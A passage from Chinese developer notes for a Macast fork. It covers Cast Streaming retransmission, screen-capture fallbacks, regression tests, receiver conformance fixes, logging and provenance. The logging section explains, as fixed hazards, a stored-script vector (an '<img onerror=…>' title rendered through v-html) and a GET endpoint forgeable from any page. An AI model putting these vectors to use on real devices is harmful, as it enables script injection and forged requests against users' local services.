      TARGET_DELAY_MS/3)`，外加 `MAX_IN_FLIGHT_FRAMES = 120` 的硬顶防跑飞。原来那个固定
      **12 帧**在 24 fps 下是 **500 ms 的排队 = 协议自己那份 200 ms 预算的 7.6 倍**，
      也就是说"低延迟通道"的大部分延迟是排在自己队里。本机量出来的窗口：RTT ≤ 33 ms 时
      恒为 66.00 ms（≈1.58 帧），再往上升到 66.67 ms（= `TARGET_DELAY_MS/3`）后饱和 ——
      **两端只差 0.67 ms，所以在 200 ms 的目标延迟下这个窗口实际上是被钉住的**，RTT 探测
      只有在哪天把 `targetDelay` 调大时才真的起作用（这句话是说给读代码的人的：别以为
      自适应在工作，它现在只是"合法地待命"）。RTT 由 checkpoint 的往返做指数平滑
      （`RTT_SMOOTHING = 0.25`，`RTT_MAX_MS = 1000` 夹住）。窗口满就**丢整帧**并置
      `awaiting_key`，PLI 后只等 IDR，kickstart 只在空闲时重发最新未确认帧的最后一包。
      ⑧ **NACK 补发是真的补发**（2026-10 改）。此前本条写的是"**没有重传路径**（设计如此）"，
      那句是**错的**，错在把 openscreen 读成了"只检测丢包、不修复"—— 它的
      `cast/streaming/impl/sender_impl.cc:556 OnReceiverIsMissingPackets` 是一条完整的
      NACK 重传路径（含 staleness 判定与 `retransmitted_count`）。电视把 NACK 挂在
      checkpoint 的**同一个复合 RTCP 包**里（`CAST` 块之后），每条 4 字节
      `(frame8, packet_id_be16, bitmask)`：`bitmask == ALL_PACKETS_LOST (0xffff)` 表示整帧都丢
      且**位图不读**，否则第 i 位（LSB 起）补 `packet_id + 1 + i`
      （`compound_rtcp_parser.cc:507`）。四条红线，全部来自 openscreen 而不是试错：
      **(a) 帧号按 checkpoint 往前展宽** —— 用 `expand_frame_id_after(id8, anchor)`（严格大于），
      **不是** `expand_frame_id`（那是"至多到 latest"，会**倒退**：`expand_frame_id(5, 4) == -251`）。
      **(b) 太新的不补** —— `sent_at > arrived - RTT` 的包还没到该到的时候，补它只是在一条
      已经拥塞的链路上再灌一份（openscreen 的 staleness 规则），计入 `retransmit_stale`。
      **(c) 修复缓冲有上限** —— `RETRANSMIT_BUFFER_BYTES = 8 MiB`，超了就把**最老的**那帧
      换成只留元数据的空壳（`(frame_id, (), ts, sent_at, 0)`），此后再被点名就计入
      `retransmit_gone`。**丢的是副本不是账**，所以 `delivered` 不会因此少算。
      **(d) 一次反馈最多补 `MAX_RETRANSMIT_PER_FEEDBACK = 64` 包**，且**发送在锁外**
      （openscreen 用一个 router 做节流，我们**故意不转写节流**，改用这个上限把它夹住）。
      补发**复用原来的密文、只换 sequence**（`_restamped(packet, seq)`：改字节 2..4），
      所以线上不会出现两个相同序号；帧号与序号在 `_begin_frame` 里**一次拿完**（`_lock` 下），
      补发路径读同一把锁 —— 曾经两个分配器各自改 `_sequence`，会发出重复序号（已修，Part 24 钉住）。
      **`retransmits` 数的是补出去的包，不是 `socket_bytes - bytes`** —— 那两个计数器
      **没有固定大小关系**：`bytes` 在 `feed()` 里、在窗口判定**之前**就加了，所以它把被窗口
      丢掉的帧也算进去；`socket_bytes` 数的是数据报（每个比 payload 多 19 字节）外加补发与
      空闲探测。所以"丢帧的流 `bytes` 领先，不丢帧的流 `socket_bytes` 领先"，
      把这个差读成"补发流量"是**错了两次**（这条谎曾写在我们自己的 `stats()` 注释里）。
      页面上「往返时延 / 补发 / 未补发」三行由此而来（`mirror_view.py`，Part 39 守着），
      `未补发` 只在非零时出现，`往返时延` 在还没有任何确认时读「暂无」而不是 `0.0 毫秒`。
      teardown 顺序
      encoder → EOF → drain → CLOSE transport → STOP(sessionId) → CLOSE receiver-0，
      保活 PING 5 秒、20 秒无 PONG 判死并回调 `_stream_lost`。**这套字段全部是从 openscreen
      转写来的，没有任何一条见过真电视**（Part 24 的假设备与发送端共用同一张表，只能证明自洽，
      见 §4.9）；真机验证 = `scripts/cast_streaming_probe.py`。回归用例 **Part 24**：
      OFFER/ANSWER 形状、AES 与 `/usr/bin/openssl` 逐字节对齐、19 字节头、切片与序号回绕、
      SR/NTP、`parse_rtcp`（PLI/checkpoint/nack/CST2/复合包）、8 位帧号扩展、多 slice 访问单元、
      真 sockets 上打完整个握手并对打到丢帧窗口、**NACK 补发（补回来的包换了序号、payload
      逐字节相同、线上没有重复序号）**与回落路径。**注意"一帧的 fixture"测不出补发**：
      `_on_rtcp` 先按 checkpoint 把 `<= anchor` 的在途项弹掉、再去读同一个包里的 NACK 字段，
      所以只发一帧再确认它 = 已经没有任何东西可补，那样写出来的用例第一次是**因为错误的原因
      通过**，之后就静默地什么都不测了（下面每条补发用例都发两帧、点名第二帧）。**v0.20：Windows 采集先问 ddagrab，gdigrab 降为运行时回落**（2026-10-02 在一台真 Windows 11 / build 26300 / ffmpeg 8.1.2 上量出根因）：gdigrab 抓的是**整块虚拟桌面**，那台机器上 4000×2571 —— **奇数高度**，x264 直接 `height not divisible by 2 (4000x2571)`、**原始分辨率档零字节产出**；ddagrab（Desktop Duplication）**每块 DXGI 输出按自己的尺寸采**（同机 0/1 号各 attach 出 2560×1440，2 号连 attach 都被拒 —— 逐字 `Failed to enumerate DXGI output 2`），所以输出表按 `range(DDAGRAB_MAX_OUTPUTS)` 逐个问、**在第一次拒绝处停下**（结果缓存进 `_ddagrab_cache`，`invalidate_capture_cache()` 清它、**不清**进程生命期的 `_ddagrab_refused` 闩），屏幕选择器 v0.20 起按输出索引提供、以实测尺寸作标签。**attach 过 ≠ 会话能跑**：运行时被桌面拒绝（进程早死 + stderr 认得出，`_DDAGRAB_FAILURE` 认 ffmpeg 自己的话）时警告一次（原因进 `ScreenMirror.log`，设置页「日志」可看）、本次运行闩住 ddagrab、重试一次 gdigrab，**系统声音仍按原设置一起采**；这条重试由 starter 独占判决 —— pump 对 `method == 'ddagrab' and not produced` 只记日志不上报（否则慢机上先报一次假「启动失败」），starter 的等待**认进程已死**（`proc.poll() is not None`）不把重试耗进整个无帧预算，`video_only_capture()` 弃声时**保留 `method`**（弃声后的 ddagrab 会话仍是 ddagrab）。真机验收：同机生产 argv（browser 目标）产出 **4,176,319 字节** fMP4，ffprobe 全量解出 h264 Constrained Baseline 2560×1440 / `r_frame_rate 24/1` / 93 帧 / 4.021 秒 / AAC 干净解码；**未验证**：真电视接收（本局域网没有 Chromecast）、第二块屏的实际投屏（只验到 attach 与生产编码）。同趟排掉一个疑点：`frag_every_frame`（v0.19 起）在 ffmpeg 8.x/9.x 上每秒约 90 条 `Packet duration: -N / dts out of range` + `pts has no value` 的 muxer 警告（macOS 合成源可复现、`frag_keyframe` 为 0、输出流逐帧可解长度正确）—— 是 muxer 噪声不是流坏了，且**到不了用户眼前**（`_drain_stderr` 按 debug 记、插件 logger 是 INFO），只记录不改代码。回归用例 **Part 54**（19 条：attach 解析三态、输出表五态、闩、回落 + 声音合并、屏幕号选中与落空、starter 快退与 pump 让位；8 个定点变异体共红 15 条且各自只在自己那句话上变红 —— 删快退判定 1、pump 提前上报 1、闩失忆 3、失败正则失明 3、探测不清 attach 缓存 1、屏幕号被忽略 2、第一次拒绝后不停 3、弃声丢 method 1；02/03/04 各自连带 2 条是因为多条用例共用同一条流）。**v0.21：macOS 13+ 先问 ScreenCaptureKit，avfoundation 降为回落路径**（2026-10-02；本机真实桌面，spawn→首帧中位 **600 对 1048 毫秒**、各三次跑，约省 450 毫秒/会话）：`_probe_screencapturekit` 问两件事 —— 系统版本够不够 13，以及这个 Python 环境 `import ScreenCaptureKit` 得不得（两个 pyobjc 发行包）；两问都过才以 SCK 为首选，否则整条路与从前逐字相同。**采集经两个管道**：视频是 NV12 帧经 stdin 喂 ffmpeg（`-f rawvideo -pix_fmt nv12 -s WxH -framerate 24 -use_wallclock_as_timestamps 1 -i -`），系统声音是独立 fd 上的 `-f f32le -ar 48000 -ac 2 -i pipe:<fd>`。四条管道事实（`scripts/sck_pipe_probe.py` 量出；`scripts/sck_capture_probe.py` 是它的可行性上游）：`-use_wallclock_as_timestamps 1` 配上原有的 `-r FPS` 才盖住 CFR（不加时 65 帧按 43 毫秒节奏只 mux 出 2.708 秒、漂约 87 毫秒）；**开着却静默的 f32le 管道会把整条命令冻在 open 上**（静止桌面不是这种 —— SCK 每 20 毫秒送整幅零 PCM；零音频加 EOF 也不冻任何东西，179,540 对 179,352 字节）；所以**弃声 = 关写端，不是重启采集**；CMSampleBuffer 回调返回即回收，不多持有。**首帧预算是 2 秒**（`SCK_FIRST_FRAME_SECONDS` —— 授权被拒时它什么都不产出，要在无帧看门狗那 3 秒之前先问出来），超时只记一条 `ScreenCaptureKit gave no frame (...)` warning 然后自动回落重试 avfoundation；`_sck_refused` 闩在**那个 ffmpeg 二进制**上、`invalidate_capture_cache()` **不清它**（改指针/换屏不是"SCK 又能用了"的新证据），所以一次拒绝只花一次尝试、本次运行不再问 SCK。音频另有 2 秒宽限（`SCK_AUDIO_GRACE_SECONDS`），等不到就单向弃声（`_audio_dropped` + `_audio_refused` 都置位，重建的采集仍保留 method、屏幕与规格），`audio_setup_needed()` 对 SCK 直接答"不需要" —— SCK 的音频 tap 不经过任何音频设备，BlackHole / 聚合设备 / 麦克风权限与它无关，弃声后还劝用户一键设置就是让他走一遍"装了什么都不会变"的安装器。**授权是同一道门**：SCK 也要屏幕录制授权；`CGPreflightScreenCaptureAccess`（ctypes 直载 CoreGraphics、只问不弹 —— 后台线程答不了授权弹窗）过了才试，没过静默落 avfoundation。**打包三处 + 一处运行时兜底**：`pyobjc-framework-ScreenCaptureKit` 与 `pyobjc-framework-CoreMedia` 进 `requirements/darwin.txt`、`setup_py2app.py` 的 includes（`ScreenCaptureKit` / `CoreMedia` 在函数内 import，提到模块顶层会毒掉 Windows/Linux 加载）、macOS job 的 pip 列表；缺任一处产物会**静默**退回 avfoundation（惰性 import 的代价与理由写在 requirements/darwin.txt 的注释里）。回归用例 **Part 55**（40 条，绿跑）：管道 argv 逐字、四条管道事实的形状、2 秒预算与单次回落、`_sck_refused` 的清与不清、弃声单向性、音频 tap 与一键设置的脱钩、权限预检只问不弹、以及 `setup_py2app.py` 的 includes 里那两个包（声明面那两处由 Part 30 自动覆盖，这一处没有人推着）。八个定点变异体各自变红 13/2/4/1/12/4/2/1 条，每个跑完整套件、还原后逐字节校验。 |

回归用例：Part 14（外部播放器 / 小窗 / yt-dlp 两种模式）、Part 15（钩子）、
Part 16（中继对打 Macast 自己的 Chromecast 接收端）、Part 17（RAOP 监督）、
Part 21（屏幕镜像：假 ffmpeg + 自家 Cast 接收端对打，真 HTTP 实时流；v0.3 的一键
BlackHole 路径全部打桩——CoreAudio/下载/安装器都不被触碰，纯测编排与降级）、
**Part 22（v0.4：两种封装、重播不对称、每会话凭据、播放页、采集预设与菜单）**、
**Part 23（v0.5：伪装成文件的字节账本 + 真 HTTP 语义（HEAD/206/恰好 n 字节/416/重连同偏移）、
SSDP 发现与设备描述、SOAP 发送序列（喂给自家接收端校验）、档位回退与看门狗、端到端镜像与菜单）**、
**Part 24（v0.6：Cast Streaming —— AES 与 `/usr/bin/openssl` 逐字节对齐、19 字节头与切片、
RTCP 读法、多 slice 访问单元，以及对打到真 TLS + 真 UDP 的自家假设备：握手、在途窗口、
checkpoint 解锁、PLI、**NACK 补发（换序号、payload 逐字节相同、线上无重复序号、
修复缓冲挤出与 staleness 各自计入哪个计数器）**、回落 LOAD、teardown 顺序）**、
**Part 25（本地文件投屏 v0.1：ffprobe 决策表逐条（含理由文案）、stdlib Range/206 服务的真 HTTP
语义（200 不带 `Content-Range`、HEAD、206、416、消失的文件）、会增长的转码文件与其长度/码率
回退、自家假 Cast 设备上的 LOAD/媒体账本/`QUIT_APP`（含接收端侧 ledger 被清）、DLNA 侧
`SetAVTransportURI` + 断点 `Seek` + SOAP 的 UTF-8 长度、播放列表自动连播、抢占看门狗的重试预算
与认输、音轨/字幕选择与 sidecar WebVTT、avfoundation 真实设备表、菜单与页脚）**、
**Part 27（按模块独立日志：claim 路由/去重复/幂等、记录只落一处、log-modules/log/log-download/
clear-log 的 module= 面与门控、每次启动清空）**、
**Part 28（模块设置面板：分组与中文标签、无枚举插件的空卡片、set-value 的类型与归属校验、
以及四条"标签表没有和仓库漂移"的守卫用例）**、
**Part 29（屏幕镜像 v0.7+v0.9 一键设置：步骤机不回退/跳过不进分母/fail 压过晚到的 leave、五态判定
逐条排优先级（capturable > loaded > on-disk > stale-receipt > absent，含"见证者抛异常不许往上冒"）、
四条安装分支各指名其步（健康机跳过、残留记录重装、密码取消如实报），外加 v0.9 那两条**反循环**断言：
"盘上有驱动"这一支必须**既不下 pkg 也不 `open`**（meta/download/verify/install/wait 全是 skipped，
note 里不许出现"重启一次"当第一答案），"CoreAudio 有 / ffmpeg 没有"这一支**不重装也不重载**、
照样建聚合设备、结尾必须说"麦克风"并且 `probe` 是 fail 而不是一个绿色的收尾；
另有 `_wait_for_blackhole` 必须回答"哪个见证者看见了"（`loaded` 不等于成功）、
`_SetupProgress` 的进度归属按调用方给的 step 走、sha 不匹配不开安装器、
崩溃只 fail 在跑的那一步、cask API 兜底带来源标签、pkgutil/HAL glob 两个探针分开问、osascript 重载
走管理员授权、进度页真 HTTP 凭据（对 token 200、错/缺 403、nosniff/no-store、不含管理令牌）、
worker 收尾（finish→busy 清→页面限期保留）、`.app` 的 plist 必须声明 `NSMicrophoneUsageDescription`）**、
**Part 26（AirPlay 镜像接收：rc 文件的引号/消毒/「用户附加项排在末尾所以能覆盖」/值不带前导 `-`、
`log_event` 整张表含两种断开拼写与"chatter 不算事件"、POSIX 上 `os.isatty(read_fd)` 证明挂的是 pty、
PATH 上放假 uxplay 走完 启动→连接→断开→停止→reload 全生命周期（断言 argv 只有 `-rc`、没有 `-p`、
`$UXPLAYRC` 全程为空、用户的 `~/.uxplayrc` 前后逐字节不变）、找不到二进制时的编译配方、
自己退出时上报最后一条 error、被替换的实例的 reader 保持沉默、与内置 AirPlay 接收端共存只提示一次）**、
**Part 35（镜像控制台搬进设置页：页面读的 HTTP 端点、`macast/mirror_view.py` 里"显示什么"的派生规则、
页面与后端共享的拼写 —— 三者各在**决定它的那一处**测；页面里没有可调用的 Python，所以它那半份契约按文本测）**、
**Part 36（菜单栏自己的内容：删 Tk 控制台曾把 `build_app_menu()` 换成 `[]`，状态栏图标于是**根本没有菜单**，
而在此之前没有任何用例构造过它 —— 现在建真的顶层并说出该有什么：服务开关、播放行、打开设置页、重投历史，
以及"不许出现电脑投屏行"这条用户裁定）**、
**Part 37（实时链路自己的算术：队列能含多少流、丢弃允许切在哪、电视在拿到 URL 前被喂多久的空、
没动过设置的安装选哪个编码器 —— 2026-09-23 那三条"延迟大/有杂音/不开硬件编码看不见"全是这一文件里的数字与位置，
所以在这里量，不去辩论）**、
**Part 38（采集开了却一帧不回的这一格：噪声过滤、"没有返回画面"的每一格必须给出门和重启、
弃掉音频口的两种采集形状（avfoundation 改 `screen:none` 且不动缓存的探测、pulse 整口删掉而不碰
`:0+0,0`）、对打到真 HTTP 的"降级成功"与"彻底失败"两条路径，以及**页面上那句话**（会话自己的
`audio_dropped()` 优先于探测缓存：弃声时「系统声音」行不再说「已启用」，状态行挂上标记））**。
测试用的是假二进制（PATH 上放个 shell 脚本），所以跑测试不需要 yt-dlp / VLC / shairport-sync / ffmpeg / uxplay。

### 4.9 Cast 接收端一致性：打桩测试永远抓不到的那一类

这一族问题的共同点是**我们没有崩、日志也没有 ERROR，只是发送端不认账**。
`verify_cast_airplay.py` 把网络全部打桩，`vlc_sender_sim.py` 只复刻 VLC 的状态机，
所以两者都抓不到；能抓到的是 `scripts/cast_conformance.py`（跑真实 pychromecast 栈）。
举证时的 pychromecast 版本是 **14.0.10**（就在本仓库 `.venv` 里）。

| 症状 | 真因 | 修复要点 / 用例 |
|---|---|---|
| 发送端调音量**卡 10 秒然后抛 `RequestTimeout`**（HA 音量条、mkchromecast 音量键） | `SET_VOLUME` 只改播放器，**从不回复** `RECEIVER_STATUS`；pychromecast 的 `ReceiverController.set_volume()` 在 `WaitResponse(REQUEST_TIMEOUT=10.0)` 里等这条回复才返回 | `_on_receiver` 的 `SET_VOLUME` 改完状态后 `_send_receiver_status(sock, src, requestId)`。Part 18 前 4 条 |
| 音量条永远 100%、静音状态读不到 | `RECEIVER_STATUS.volume` 与 `MEDIA_STATUS.volume` 都硬编码 `{"level":1.0,"muted":False}`；发送端按**我们报的值** ±0.1 算下一档 | 存 `_volume`/`_muted`，两处 status 都回真值 |
| mkchromecast 的 `--hijack` **每 5 秒重投一次** | `applications[].displayName` 回了 `"Macast"`，而真机对 `CC1AD845` 一律回 `"Default Media Receiver"`，发送端把别的名字当成"接收端被抢了" | `DEFAULT_MEDIA_APP_NAME` |
| 播完了手机还一直显示"正在播放" | `GET_STATUS` 只要有 media 描述就回 `PLAYING`，**永不**降级 | `set_state_*` 观测 + `_observed_state()`；结束带 `idleReason`（FINISHED / ERROR / CANCELLED） |
| 刚 LOAD 完就把新视频判成 `CANCELLED` | LOAD 换片之后 mpv 才补发**旧文件**的 `end-file reason=stop` | `_note_stopped` 只采信"当前媒体已经报过播放"的终止事件；ERROR 例外（换片只会以 stop 结束） |
| mDNS 不可用时发送端**认不出** Macast | `ssdp_udn` 带了 `"uuid:"` 前缀，而 pychromecast 用 `UUID(udn.replace("-",""))` 解析、**整个 `device_info` 返回 None** | `_eureka_info` 发裸 UUID |
| 每次发现都多一次失败请求 | `capabilities` 里缺 `multizone_supported`，而 pychromecast 在 `device_info` 存在时缺省为 **True** → 去探 `https://host:8443/...?params=multizone` | 显式 `multizone_supported: false` |

两个记录下来的操作细节：

- **`Chromecast.set_volume` 在 pychromecast 14 里不存在**（`volume_up()` 自己调用它会
  AttributeError，是上游的 bug）。要复现接收端音量路径，得用
  `cast.socket_client.receiver_controller.set_volume(...)`——那才是走 `WaitResponse` 的那条。
- **本机跑真机验证不要碰用户配置**（§10）：`SETTING_DIR` 是 import 时由 appdirs 算出来的常量，
  所以在 `import macast` **之前**把 `appdirs.user_config_dir` 指向临时目录，日志和设置
  就都落在临时目录里了。示例见本轮验证用的 `/tmp/macast_tempconf.py` 那种写法。
- **探针要用的测试流必须支持 Range**：`http.server.SimpleHTTPRequestHandler` 不支持，
  mpv 会在 seek/prefetch 时 `end-file reason=error`、`file_error='no audio or video data played'`
  （和 §6 里 ffmpeg 那条是同一个坑）。`cast_conformance.py` 自带一个最小 Range handler。

### 4.10 日志：三处叠加的膨胀（外加一个注入面）

2026-09 在一台跑了 49 分钟的实例上实测：`macast.log` **10809 行 / 1.35 MB**
（≈27 KB/分钟 ≈ 1.6 MB/小时 ≈ 40 MB/天），而设置页一打开日志面板就把整份文件吃进 DOM。
三个原因叠在一起，只改其中一个都不够：

| 层 | 原因 | 现在 |
|---|---|---|
| 写文件 | 根 logger 用 `logging.FileHandler`（无轮转）；CherryPy 还往**同一个文件**再挂一个不轮转的 handler | 根 logger 换成 `RotatingFileHandler(2 MB × 2 份)`；`log.access_file` / `log.error_file` 留空 |
| 重复写 | `cherrypy.access` 的记录**同时**被 CherryPy 自己的 handler 和根 handler 各写一遍 —— 每行请求出现两次（实测 2 × 2621 行 ≈ 文件的 **64%**） | 去掉 CherryPy 自己的 handler，记录仍经 propagate 落到根 handler（因此才继续有轮转） |
| 读日志 | `/api?query=log` 用 `f.read()` 回整份；前端 `v-html` 把它塞进 DOM（10.5k 个 `<br/>`） | 接口只回末尾 N 行（`?tail=` / `?all=1`，默认 2000 行 / 512 KB），前端 `<pre>{{ }}</pre>` 文本渲染，且切到面板才拉 |

**红线（改动前先读这几条）：**

- **`log.access_file` 必须留空，且只在这个前提下才安全**：CherryPy 的 logger 会 propagate 到
  根 logger，请求日志才继续落在 `macast.log` 里（带轮转）。谁要是给它们设了 `propagate = False`，
  请求日志就**静默消失**——不再有第二份兜底。Part 20 用一条真实记录守着这个前提。
- **日志正文永远不要用 `v-html`**：日志里含**发送端提供**的 DIDL `dc:title` / URL
  （`protocol.py` 会把整段 `CurrentURIMetaData` 打进去），局域网里任何一台设备投一个带
  `<img onerror=…>` 的标题，打开设置页就会执行。现在是 `<pre>{{ macast_log }}</pre>`。
- **清空走 POST**（`clear-log`，loopback/令牌门控）：GET 版会被任意网页用 `<img>` 触发。
  `log-download` 是 GET，所以它和 `log`/`status` 一样在管理门控名单里（Part 20 有用例）。
- **尾部读取必须 `errors='replace'` 并丢掉切出来的半行**：窗口边界必然落在多字节字符中间，
  严格解码会抛 `UnicodeDecodeError`。
- **每次启动由 `clear_env()` → `remove_log_files()` 删掉 `macast.log` 和轮转出的 `.1/.2`**：
  只删日志本身会让旧备份永远留着。

### 4.10b 按模块独立日志（`macast/logsplit.py`，Part 27）

镜像/投屏这类高频插件如果往共享的 `macast.log` 里按帧打日志，核心协议的行会被淹掉。
`logsplit.claim(name)` 给一个 logger 挂上 `logs/<Name>.log`（`RotatingFileHandler`，1 MB × 1 份）
并把 `propagate` 关掉——**记录只落在自己的文件里，绝不进 macast.log**，这条"恰好一处"就是全部设计。

- **认领发生在插件导入时**：`macast.py` 的 `load_from_file` 与 `_load_bundled_plugins`
  两条路径都调 `logsplit.claim_from_module(module)`（看模块顶层的 `logger` 属性）。
  给新插件加独立日志**不需要**改 logsplit，只要它的 logger 是模块级 `logger`。
- **`clear_env()` 同时调 `logsplit.remove_all()`**：启动时清空 `logs/`，与 macast.log 同语义。
- **API 四个端点全部在管理门控名单里**（本机 / HTTPS / 令牌）：`query=log-modules` 列表、
  `query=log&module=<名>` 尾部读取（`整体` 也接受，等价于不带 module）、
  `log-download&module=`、`clear-log` 带 `module=` 字段。不带 module 的 `log` 仍是 macast.log。
- **页面日志面板是下拉切换**（默认「整体日志」），模块行显示文件大小；模块文件被清空后
  选择器自动回落。**红线不变：日志正文永远 `<pre>{{ }}</pre>`，模块日志同样不许 `v-html`。**

### 4.11 「模块设置」面板：配置键的归属（`macast/module_settings.py`，Part 28）

设置页新 tab「模块设置」把持久化配置**按所属模块分组**展示（核心 / 播放器 / 每个已加载插件 /
其他（未归类）），让普通用户知道每个键是谁的。红线与坑：

- **归属表只写在 `module_settings.py`，不散在各插件里**：`CORE_LABELS` / `PLAYER_LABELS` /
  `PLUGIN_LABELS`（按插件文件基名索引）给出中文标签与提示。**不要**改成"扫描插件的
  `SettingProperty` 枚举成员"——枚举别名规则会让 value 相同的成员（如 `PlayerHW_Disable = 0`）
  把 `PlayerSize_Small` 吞成别名，归属会悄悄错。Part 28 用四条漂移用例（仓库全量扫描
  "实际被持久化的键 ⊆ 标签表"、幽灵标签、core 表==枚举、player ⊆ 枚举）代替枚举扫描。
- **扫描"被持久化的键"只认 `Setting.get/set/has/unset(SettingProperty.X` 第一参数**；
  裸引用可能是值比较（mpv.py:602 `!= SettingProperty.PlayerHW_Disable`），`.value` 结尾的是常量。
- **给插件加新的持久化键时，必须同步往对应标签表加条目**，否则漂移用例当场变红。
  没写枚举的老安装副本不会被显示幽灵键（标签 ∩ 实际加载的枚举）。
- **读写都在门控内**：GET `query=module-settings` 返回分组，POST `set-module-setting`
  （表里 `GATE_CODE`，§4.7c —— 它能写自动化钩子的键，值下次投屏就进 `subprocess(shell=True)`）
  改值/删值；拒绝无归属的键；list/dict 值只读（引导去「高级设置」JSON）。
- 由此 raop 升到 **v0.2**：新增 `RAOP_Device_Name`（覆盖 shairport-sync 服务名，缺省仍跟随
  DLNA 友好名），这是它第一个自己的持久化配置。

### 4.12 署名与来源：`scripts/provenance.py` + `docs/Provenance.md`（Part 34）

本仓库是 fork，所以"这段代码是谁写的"是一句**会被读者读到**的陈述。
已定的做法只有一条：**度量，然后按度量结果只加不减**。用户提的"去掉 fork 与所有原项目
信息"这一半不做（细节见 `docs/Provenance.md` §0）。

- **别拿文件头当来源证据，也别拿 `git blame` 单独当证据。** 头标记的是当初的意图：
  `macast/discovery.py`、`protocol_cast.py`、`protocol_group.py`、`protocol_airplay.py`、
  `scripts/verify_cast_airplay.py` 挂着上游的头，blame 却说 0 行是上游的（代码早被重写干净）。
  反过来 blame 也会说谎：**从别的仓库粘进来的文件**（`macast/plugins/**` 来自
  `xfangfang/Macast-plugins`）在本仓库历史里没有祖先，粘贴那条提交会被当成作者 ——
  所以有一份手写的 `VENDORED` 表；**改名/挪位置**同样丢 blame，所以再比 blob SHA
  （<5 行的文件不参与，空文件的 blob 全世界都一样）。
- **vendored 文件禁止盖我们的名**，`ours`/`mixed` 才盖。这是 `problems()` 的第三条规则，
  也是 Part 34 用合成行单独测过的两个方向之一（另一个是"删掉上游声明必红"）。
- **给文件加头是外科手术**：插入点必须留在**顶部连续的注释块**里（§4.5 —— 插件清单只从
  那个块解析，位置歪了插件会静默装不上），而且不能让 docstring 不再是第一条语句。
  `--stamp` 的插入位置由 `notice_index()` 承担，Part 34 既测它、又用**自家解析器**复核
  "盖过名的插件仍被识别"。
- **`macast/ssdp.py` 有第三层**：Coherence 那一支的 MIT 作者群（Tim Potter 等），
  义务主体既不是我们也不是上游，所以**重写掉上游行也不消灭它**（`THIRD_PARTY` 表守着）。
- **台账必须和代码同步**：改完归属就跑 `provenance.py --check --stamp`，再把
  `docs/Provenance.md` 的 `provenance-ledger` 注释行与两张表的数字改成工具算出来的值，
  然后跑套件 —— Part 34 会拿这三处互相比对（漂移当场变红）。它需要完整历史，
  浅克隆会明确报失败而不是假装通过。
- **本机这份克隆就是"明确报失败"的那种**（2026-09-24 实测）：`git cat-file -t
  19879235ef…`（fork 点）报 `could not get object info`，`git log --all` 最早三条是
  `Initial commit` / `First Commit` —— **215 条上游提交的对象根本不在这里**，不是
  `.git/shallow` 那种可以 `--unshallow` 补回来的浅克隆。后果要写明白：
  ① `provenance.py --check` 在这里只输出 `cannot read history`，Part 34 的 6 条用例
  **每次跑都红**，与代码改动无关（本轮三次跑全部如此）；② 因此**这台机器上无法更新台账**，
  改了 `.py` 的归属也就改了 `our_lines`/`upstream_lines`，只能把重算留给有完整历史的克隆
  （判据：`docs/Provenance.md` 的 `provenance-ledger` 行与工具输出一致）。
  **不要**用手算的差值去把文档改到"看起来过"——Part 34 比的是工具输出，不是差值。
- **而且这不是"换一台机器就好了"：fork 点在 GitHub 上也不存在**（2026-09-25 实测
  `gh api repos/pingod/Macast/commits/19879235ef…` → **422 "No commit found for SHA"**）。
  所以 Part 34 那 6 条**在 CI 里也永远红**，"CI 全绿"这一句在本仓库永远说不出口 ——
  而这恰恰是 `--ci` 存在的理由：它不假装绿，而是把"允许红哪些"写成一份可判定的契约
  （见 `scripts/verify_cast_airplay.py` 的 `ci_gate()`）。三条红线都在它的用例里（Part 50 六条合成用例 +
  一条"哨兵必须是本轮真的跑过的 Part 34 用例"）：
  ① Part 34 之外**任何**一条红 → 拒（否则豁免名单会变成新的"沉默区"）；
  ② 豁免的前提必须自己成立：哨兵那条用例（"the ledger is computable here…"）必须在
  Part 34 的用例名单里，且它的红/绿必须与 `git cat-file -e <fork 点>^{commit}` 的实际结果
  **相反**（有历史却还红 = 真漂移，照红处理）。这一条在 `ci_gate()` 里叫 `premise`，
  Part 50 用"哨兵离开 Part 34 名单"和"没有历史却 Part 34 全绿"两个方向各测一次；
  ③ ②里那个"全绿"不是假想题，是**量出来的**（2026-09-25，Linux 容器里一份没有 `.git` 的拷贝）：
  这种环境下 `provenance.py` 根本不输出 `cannot read history`，它先被 git 的
  `fatal: not a git repository` 打死、留下一段 traceback，旧判据看不见这一形，于是哨兵**绿**，
  `--ci` 当场拒绝（`the sentinel contradicts the history: red=False present=False`）。
  现在 `_shallow34` 认两种形状（工具自己的 marker 与 git 的 no-repo），因为
  **"没测任何东西"永远不许读成"测过了且通过"**；`ci_gate()` 收的是调用方算好的布尔值，
  所以"忘了包 OSError ⇒ 无 git 的环境误开豁免"这一格仍是读代码守的、不是用例守的
  （判据坐在套件末尾的 `try/except OSError` 里，verify_cast_airplay.py:17595 起）。
  同一趟还改掉一个自己的错：`--ci` 拒绝时原先在 SUMMARY **之前** `sys.exit(1)`，
  恰好在最该看的时候把清单和总数藏起来；现在门只决定退出码，清单照打（变异体：注入一条
  Part 34 之外的红 ⇒ `EXIT=1` 且 SUMMARY 仍在）。
  也就是说：**台账在哪些机器上可算，这件事本身是一条被测的陈述**，不是环境备注。

### 4.13 设置页的「帮助」与页宽：会被读到的对外文案（`macast/xml/setting.html`，Part 44）

2026-09-24 之前那份帮助是**上游的 FAQ**：它告诉读者 58880 被占时应用会崩溃（不会——
`AutoPortServer` 另绑随机端口并改名 `Macast(0123)`，见 §4.2）、IINA/Web/Live/PotPlayer
要去下载（本仓库 15 个插件全内置，见 §4.8）、以及一个指向别的仓库的 wiki 链接。
**它从来没有被测红过，因为套件里没有任何一条用例会去读那段散文** —— 这正是 §4.2 末条
（假 ffmpeg 抄真工具的格式）的同一族问题：不提问的检查等于通过的检查。

现在 **Part 44 把文案和代码事实双向绑定**：帮助里每一个数字都问两遍，一遍问页面、
一遍问决定它的那处代码（`utils.DEFAULT_PORT`、`protocol_cast.CAST_PORT`、
`protocol_airplay.AIRPLAY_PORT`、`plugins/{renderer,protocol}/` 的目录清点、
`screen_mirror` 的 `OUTPUTS` / `CAST_STREAM_MAX_BITRATE` / `DLNA_PROFILES` /
`DLNA_PREFILL_SECONDS` / `NO_FRAME_SECONDS`、`Macast.py` 的 `LOG_MAX_BYTES` /
`LOG_BACKUP_COUNT`、`protocol.py` 的 `sub_exts` 与 `cast` 分支的 `_token_present()`、
`appdirs.user_config_dir('Macast', 'xfangfang')`）。**所以改这些常量或配置目录时，
Part 44 会红——那是它在做该做的事**：同一趟里把帮助那句话改掉，别改断言。

- **新增一个标签页 = 必须同时写进帮助**。用例把页面的 `<el-tab-pane label>` 列表和帮助
  「一共 N 个标签」下面那张列表**逐字比对**（两边都必须恰好相等），所以漏写会红，
